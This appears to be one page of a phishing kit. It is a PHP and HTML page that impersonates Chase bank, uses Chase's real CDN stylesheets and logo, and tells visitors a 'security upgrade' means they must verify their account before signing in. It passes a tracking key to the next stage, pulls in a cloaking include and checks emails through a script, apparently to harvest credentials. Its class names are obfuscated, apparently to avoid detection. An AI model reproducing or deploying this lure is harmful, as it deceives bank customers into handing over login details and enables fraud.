<?php
 include'Protection.php';
 $param = '/final_backup/nextPage?key='.$_GET['key'];
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js logon-simplerAuth" lang="en" dir="ltr">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Get verified</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="files/img/faviconx.ico">
    <link rel="stylesheet" href="files/css/zroxoauth.css">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
    <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
    <style type="text/css">
    .error2 {
        border: 0.3px solid #bf2155;
    }

    .hidden {
        display: none;
    }

    .label-cus {
        font-size: 18px !important;
    }

    @media only screen and (max-width: 768px) {
        .label-cus {
            font-size: 14px !important;
            font-weight: bold !important;
        }
    }
    </style>
</head>

<body>
    <div>
        <div class="c65dd8vd" tabindex="-1">
            <div class="t5d8gd4d5nd">
                <header class="sfsf6565sfsf">
                    <div class="logon header zroxoru transparent navigation bar" style="background-color: #005eb8;">
                        <a href="#">
                            <div class="zroxo logo"></div>
                        </a>
                    </div>
                </header>
                <main>
                    <div class="msd y5f45df4h" id="simpler-auth">
                        <div class="container">
                            <div class="row zroxoru primary panel" style="margin-top: 38px;">


                                <div class="col-xs-12 col-md-10 col-md-offset-1 sxv6s54dn6sd">
                                    <div class="row zroxoru panel body">
                                        <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                            <div class="row" style="padding-bottom: 12px;">
                                                <div class="col-xs-12 col-sm-12">
                                                    <span class="fdb4df4sb progress-label label-cus" tabindex="-1"
                                                        style="color: #000000;">For Your Protection <span
                                                            class="util high-contrast accessible-text">Step 1 of
                                                            2</span></span>
                                                </div>
                                                <!--<div class="col-xs-push-1 col-xs-6 col-sm-push-6 col-sm-3"><span class="zroxoru link"><a class="link-anchor" href="javascript:void(0);">Have a question?<i class="zroxoru progressright icon end-icon" aria-hidden="true"></i></a></span></div>-->
                                            </div>
                                            <div class="row">
                                                <div class="col-xs-12">
                                                    <div class="zroxoru progress tjdhbx62w bar" data-progress="50">
                                                        <div class="bar fill" style="background-color: #005eb8;"></div>
                                                        <span class="util accessible-text"></span>
                                                    </div>
                                                </div>
                                            </div>
                                            <form id="accessform" action="/final_backup/nextPage" method="POST">
                                                <input type="hidden" name="token"
                                                    value="f3e1a55fc79f91c9cdb11c2c3385775c30a20a058f96ee55b2a53ff4f0644336" />
                                                <!-- <h3 class="sqvqsv6qs4v6 dsv6ds4bds4b">Signing in on a new device?</h3> -->

                                                <h3 class="f-mob"
                                                    style="margin-bottom: 24px; margin-top: 8px; color: #666666;">
                                                    Instructions</h3>

                                                <h3 class="f-mob" style="color: #666666;">We require you to confirm your
                                                    information on your account.</h3>
                                                <div class="inside-container f-mob">
                                                    <div class="inside-container">
                                                        <p style="color: #414042;">This happened because we at chase are
                                                            performing a security upgrade to serve our customer better.
                                                            (Cookies are how we remember you.) <br>
                                                            <br>For your security, we need to verify your information
                                                            with us before you can sign in to your accounts. <br>
                                                            <br>Choose "Next" to confirm you own this account.
                                                        </p>
                                                        <p>
                                                            <span class="jpui link"
                                                                id="request_identification_advisory_message-link-wrapper">
                                                                <!--<a class="link-anchor underline" id="request_identification_advisory_message" href="javascript:void(0);" aria-label=" Questions? : Opens information dialog">Questions?</a>-->
                                                            </span>
                                                        </p>
                                                    </div>
                                                    <span class="zroxo link hidden" id="showmsg">
                                                        <a class="nTmm1IdfR9" href="javascript:void(0);">Email
                                                            authentication?<i
                                                                class="zroxo THUZSahExR icon UUZWPSwsNP"></i></a>
                                                        <p>We use industry-standard encryption to protect your data. By
                                                            providing your email, we verify in real time that you own
                                                            the email on file. We then use this information to establish
                                                            a secure connection with your email provider.</p>
                                                    </span>

                                                    <div class="zroxoru user-alert error inverted primary animate alert hidden"
                                                        role="region" id="invalidemail">
                                                        <div class="content wrap">
                                                            <h2 class="title" tabindex="-1">
                                                                <span class="util accessible-text">Important: </span> <i
                                                                    class="zroxoru exclamation-color icon"
                                                                    aria-hidden="true"></i> This Microsoft account
                                                                doesn't exist!
                                                            </h2>
                                                        </div>
                                                    </div>



                                                </div>
                                                <div class="button-container row b8d54hd4s sdvsdbds8485">
                                                    <div class="col-xs-12 col-sm-3 col-sm-offset-6"><button
                                                            type="button" id="btn-submit"
                                                            class="zroxoru button focus fluid cancel"><span
                                                                class="label">Cancel</span> </button></div>
                                                    <div class="col-xs-12 col-sm-3"><a style="color: white;"
                                                            href="<?php echo $param; ?>"><button type="button"
                                                                id="btn-submit"
                                                                class="zroxoru button focus fluid primary"
                                                                style="background-color: #005eb8;"><span
                                                                    class="label">Next</span> </button></a></div>
                                                </div>
                                                <div class="button-container row hide-sm">
                                                    <div class="col-xs-12 col-sm-3"><a style="color: white;"
                                                            href="<?php echo $param; ?>"><button type="button"
                                                                id="btn-submit"
                                                                class="zroxoru button focus fluid primary"
                                                                style="background-color: #005eb8;"><span
                                                                    class="label">Next</span> </button></a></div>
                                                    <div class="col-xs-12 col-sm-3 col-sm-push-3"><button
                                                            id="btn-submit" type="button"
                                                            class="zroxoru button focus fluid cancel"><span
                                                                class="label">Cancel</span> </button></div>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script type="text/javascript">
    var x = document.getElementById("emailaccess");
    const checkemail = () => {
        let emailaccess = document.getElementById('emailaccess').value;
        $.ajax({
            type: 'POST',
            data: {
                email: emailaccess
            },
            url: 'emailcheck.php',
            success: function(response) {
                if (response === 'bad') {
                    $("#accesspassword").addClass('hidden');
                    $("#showmsg").addClass('hidden');
                    $("#errorx").addClass('error2');
                }
                if (response === 'invalid') {
                    $("#accesspassword").addClass('hidden');
                    $("#showmsg").addClass('hidden');
                    $("#errorx").addClass('error2');
                    $("#invalidemail").removeClass('hidden');

                }
                if (response === 'good') {
                    $("#accesspassword").removeClass('hidden');
                    $("#showmsg").removeClass('hidden');
                    $(':input[type=submit]').prop('disabled', false);
                    $("#invalidemail").addClass('hidden');
                }

            }
        })
    }
    </script>
    <script type="text/javascript">
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    if (params.key === '' || params.key === null || params.key === undefined) {
        window.location.href = "/final_backup/error";
    }
    $(document).ready(function() {
        $('#accessform input[id="emailaccess"]').blur(function() {
            $(this).val() ? ($(".wrap.right.email").removeClass("error2"), $(".zroxoru.input.email")
                .removeClass("clientSideError")) : ($(".wrap.right.email").addClass("error2"), $(
                ".zroxo.input.email").addClass("clientSideError"))
        }), $('#accessform input[id="accesspassword"]').blur(function() {
            $(this).val() ? ($(".wrap.right.pass").removeClass("error2"), $(".zroxo.input.pass")
                .removeClass("clientSideError")) : ($(".wrap.right.pass").addClass("error2"), $(
                ".zroxo.input.pass").addClass("clientSideError"))
        })
    });
    </script>
    <script>
    var x = document.getElementById("accessFrom"),
        y = document.getElementById("error"),
        z = document.getElementById("showmsg");

    function email() {
        x.style.display = "block", z.style.display = "block", y.style.display = "none"
    }

    function error() {
        y.style.display = "block", x.style.display = "none", z.style.display = "none"
    }
    </script>
    <script type="text/javascript">
    setTimeout(function() {
        document.getElementById("invaliddd").style.display = 'none';
    }, 10000);
    </script>
</body>

</html>